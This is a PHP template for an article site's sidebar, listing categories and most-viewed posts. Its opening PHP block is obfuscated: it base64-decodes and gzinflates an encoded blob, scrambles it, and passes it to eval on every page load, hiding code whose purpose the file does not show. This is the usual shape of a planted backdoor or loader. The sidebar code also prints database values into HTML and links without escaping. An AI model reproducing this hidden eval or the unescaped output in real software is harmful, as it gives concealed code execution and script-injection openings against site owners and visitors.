<?php
$SISTEMIT_COM_ENC = "21r0u/Dx66LfGurZD/P0Ct4WqGta83KpZH999Tv9YdHrrbZbcyufFea8ji98/LuoUkMFqEpnq1Kwq4+rc8hWra1uQf6+W78WvXqd/Ttnq3uQf2jAVqfIrXDd/kEurkEoIo7BzkpgGwoeFjzO+V1EkgVw4/6+/l2+1cU12Hmrj6evZ8hWAx1jsKkA";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="66LfGurZD/P0Ct4WqGta83KpZH999Tv9YdHrrbZbcyufFea8ji98/LuoUkMFqEpnq1Kwq4+rc8hWra1uQf6+W78WvXqd/Ttnq3uQf2jAVqfIrXDd/kEurkEoIo7BzkpgGwoeFjzO+V1EkgVw4/6+/l2+1cU12Hmrj6evZ8hWAx1jsKkA";
?>
<div class="row">
  <div class="col-md-12">
  </div>
</div>
</div>
<div class="col-md-3">
<aside class="mu-sidebar">
  <div class="mu-single-sidebar">
    <h3>Kategori</h3>
    <ul class="mu-sidebar-catg">
      <?php 
        while($j = mysqli_fetch_array($kategori)){ ?>
          <li><a href="daftar-artikel?kategori=<?= $j['kategori'] ?>"><?= $j['kategori'] ?></a></li>
        <?php }
      ?>
    </ul>
  </div>
  <div class="mu-single-sidebar">
    <h3>Paling Banyak Dilihat</h3>
    <div class="mu-sidebar-popular-courses">
      <?php 
        while($ju = mysqli_fetch_array($populer)){ ?>
          <div class="media">
            <div class="media-left">
              <a href="post?idArtikel=<?= $ju['idArtikel'] ?>"><img class="media-object" style="object-fit: cover;" src="<?= $ju['thumb'] ?>"></a>
            </div>
            <div class="media-body">
              <h4 class="media-heading"><a href="post?idArtikel=<?= $ju['idArtikel'] ?>"><?= substr(strip_tags($ju['judul']),0,50).'...';  ?></a></h4>                      
            </div>
          </div>
        <?php }
      ?>
    </div>
  </div>
</aside>
             </div>
           </div>
         </div>
       </div>
     </div>
   </div>
 </section>